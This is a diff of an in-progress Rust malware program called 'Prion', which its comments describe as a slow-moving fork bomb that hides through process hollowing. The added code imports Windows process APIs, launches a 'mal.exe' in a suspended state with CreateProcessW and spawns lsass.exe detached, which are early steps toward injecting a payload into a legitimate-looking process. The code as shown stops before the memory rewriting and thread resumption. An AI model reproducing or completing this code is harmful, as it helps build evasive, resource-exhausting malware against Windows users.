@@ -1,5 +1,6 @@
 //Prion is a slow-moving fork bomb which tries to hide using process hollowing
 //Created for self-educational purposes - DO NOT RUN OR DISTRIBUTE!
+#![allow(unused_imports)]
 
 use std::process::{Command, Stdio};
 use std::{thread, time, env};
@@ -9,9 +10,14 @@ use std::io::prelude::*;
 use std::ptr::null;
 use std::str::from_utf8;
 use std::string::String;
+use std::ffi::CString;
+use std::mem;
 
 extern crate subprocess;
 use subprocess::{Popen, PopenConfig, Exec};
+
+extern crate kernel32;
+//use kernel32::CreateProcessW;
 
 extern crate winapi;
 use std::ffi::OsStr;
@@ -19,6 +25,11 @@ use std::iter::once;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr::null_mut;
 use winapi::um::winuser::{MB_OK, MessageBoxW};
+use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP};
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW};
+//use winapi::shared::ntdef::FALSE;
+use winapi::shared::minwindef::{FALSE, DWORD};
 
 extern crate bytes;
 use bytes::Bytes;
@@ -55,25 +66,36 @@ fn main() {
 	//println!("File:\n{:?}\n", mal_file);
 	//println!("Buf contents:\n{:?}\n", mal_buf);
 	
-	let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();
+	//let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();
 
+	let mut legit_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
+	let mut mal_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
+	
+	let mut proc_info = PROCESS_INFORMATION {
+            hProcess: null_mut(),
+            hThread: null_mut(),
+            dwProcessId: 0,
+            dwThreadId: 0,
+	};
+	
+	let mut startup_info : STARTUPINFOW = unsafe { mem::zeroed() };
+	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
+	
+	let mal_proc = unsafe { 
+						CreateProcessW (null_mut(),
+										//legit_path.as_mut_ptr(),
+										mal_path.as_mut_ptr(),
+										null_mut(), null_mut(), FALSE,
+										//Create thread in suspended state
+										//0x00000004,
+										//0x00000010,
+										CREATE_SUSPENDED,
+										null_mut(), null_mut(),
+										&mut startup_info, &mut proc_info);						
+							};
+	
 	let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
 	//legit_proc.popen();
-	
-	/*
-	let mal_parse = Pe::new(&mal_buf).unwrap();
-	let img_file_header = mal_parse.get_header();
-	
-	//Test to see if PE parsing has worked
-	//s_buf should output "PE[null][null]" when converted to str
-	let mut s_buf = [0; 4];
-	let signature = img_file_header.signature;
-	LittleEndian::write_u32(&mut s_buf, signature);
-	let opt_header = &img_file_header.size_of_optional_header;
-	println!("PE parse:\n{:?} -> {:?}\n{:?}\n", signature, from_utf8(&s_buf).unwrap(), opt_header);
-	
-	//thread::sleep(time::Duration::from_millis(1000));
-	*/
 	
 	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
 	
@@ -84,7 +106,11 @@ fn main() {
 	
 	println!("PE e_magic:{:?}\n", mal_pe.dos_header().e_magic);
 	
-	println!("legit_proc:\n{:?}", legit_proc);
+	println!("legit_proc:\n{:?}\n", legit_proc);
+	
+	println!("mal_proc:\n{:?}\n", mal_proc);
+	
+	thread::sleep(time::Duration::from_millis(10000));
 	
 	println!("mal process created in suspended state.\n");
 	println!("Process data:\npidh: {:?}\npinh: {:?}", mal_data.pidh, mal_data.pinh)
